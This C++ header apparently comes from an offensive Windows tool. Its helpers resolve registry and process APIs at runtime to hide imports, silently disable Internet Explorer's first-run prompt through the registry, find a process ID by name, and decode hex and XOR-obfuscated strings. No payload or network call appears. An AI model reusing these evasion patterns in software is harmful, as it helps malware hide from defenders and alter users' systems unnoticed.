#pragma once

#include <Windows.h>
#include <Tlhelp32.h>
#include <string>
#include "Config.h"

// Function prototypes
// ------------------------------------------------------------------------

typedef LSTATUS(WINAPI* _RegCreateKeyExA)(
    HKEY                        hKey,
    LPCSTR                      lpSubKey,
    DWORD                       Reserved,
    LPSTR                       lpClass,
    DWORD                       dwOptions,
    REGSAM                      samDesired,
    const LPSECURITY_ATTRIBUTES lpSecurityAttributes,
    PHKEY                       phkResult,
    LPDWORD                     lpdwDisposition
    );

typedef LSTATUS(WINAPI* _RegSetValueExA)(
    HKEY       hKey,
    LPCSTR     lpValueName,
    DWORD      Reserved,
    DWORD      dwType,
    const BYTE *lpData,
    DWORD      cbData
    );

typedef LSTATUS(WINAPI* _RegCloseKey)(
    HKEY hKey
    );

// To disable IE first-run customize prompt through the registry
// ------------------------------------------------------------------------

BOOL disable_ie_prompt() {
    // Dynamically resolve the API function from Advapi32.dll
    HMODULE advapi32 = LoadLibraryA("Advapi32.dll");

    _RegCreateKeyExA RegCreateKeyExA = (_RegCreateKeyExA)GetProcAddress(advapi32, "RegCreateKeyExA");
    if (RegCreateKeyExA == NULL)
        return FALSE;

    _RegSetValueExA RegSetValueExA = (_RegSetValueExA)GetProcAddress(advapi32, "RegSetValueExA");
    if (RegSetValueExA == NULL)
        return FALSE;

    _RegCloseKey RegCloseKey = (_RegCloseKey)GetProcAddress(advapi32, "RegCloseKey");
    if (RegCloseKey == NULL)
        return FALSE;

    // Disable IE prompt
    DWORD data = 1;
    DWORD dwDisposition;
    HKEY hKey;

    RegCreateKeyExA(HKEY_CURRENT_USER, "Software\\Microsoft\\Internet Explorer\\Main", 0, NULL, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, NULL, &hKey, &dwDisposition);

    if (RegSetValueExA(hKey, "DisableFirstRunCustomize", 0, REG_DWORD, reinterpret_cast<BYTE *>(&data), sizeof(data)) != ERROR_SUCCESS) { 
        RegCloseKey(hKey);
        return FALSE; 
    }

    RegCloseKey(hKey);
    
    return TRUE;
}

// Get PID by process name
// ------------------------------------------------------------------------

DWORD find_pid(const char* procname) {
    // Dynamically resolve some functions
    HMODULE kernel32 = GetModuleHandleA("Kernel32.dll");

    using CreateToolhelp32SnapshotPrototype = HANDLE(WINAPI *)(DWORD, DWORD);
    CreateToolhelp32SnapshotPrototype CreateToolhelp32Snapshot = (CreateToolhelp32SnapshotPrototype)GetProcAddress(kernel32, "CreateToolhelp32Snapshot");
    
    using Process32FirstPrototype = BOOL(WINAPI *)(HANDLE, LPPROCESSENTRY32);
    Process32FirstPrototype Process32First = (Process32FirstPrototype)GetProcAddress(kernel32, "Process32First");
    
    using Process32NextPrototype = BOOL(WINAPI *)(HANDLE, LPPROCESSENTRY32);
    Process32NextPrototype Process32Next = (Process32NextPrototype)GetProcAddress(kernel32, "Process32Next");
    
    // Init some important local variables
    HANDLE hProcSnap;
    PROCESSENTRY32 pe32;
    DWORD pid = 0;
    pe32.dwSize = sizeof(PROCESSENTRY32);

    // Find the PID now by enumerating a snapshot of all the running processes
    hProcSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (INVALID_HANDLE_VALUE == hProcSnap)
        return 0;

    if (!Process32First(hProcSnap, &pe32)) {
        CloseHandle(hProcSnap);
        return 0;
    }

    while (Process32Next(hProcSnap, &pe32)) {
        if (lstrcmpiA(procname, pe32.szExeFile) == 0) {
            pid = pe32.th32ProcessID;
            break;
        }
    }
    
    // Cleanup
    CloseHandle(hProcSnap);

    return pid;
}

// To convert hex string to raw byte string
// ------------------------------------------------------------------------

std::string hex_to_byte_string(std::string buffer) {
    int len = buffer.length();
    std::string newString;
    for (int i=0; i < len; i+=2) {
        std::string byte = buffer.substr(i,2);
        char chr = (char)(int)strtol(byte.c_str(), NULL, 16);
        newString.push_back(chr);
    }
    return newString;
}

// To decrypt the XOR-encrypted strings at run-time
// ------------------------------------------------------------------------

std::string decrypt_string(const std::initializer_list<int> &encryptedString) {
    int counter = 0;
    std::string decryptedString = "";
    int xorKey = XOR_KEY;

    for (auto byte : encryptedString) {
        if (byte == -1)
            break;
        else
            decryptedString += (byte ^ xorKey) % 255;

        counter++;
    }

    return decryptedString;
}
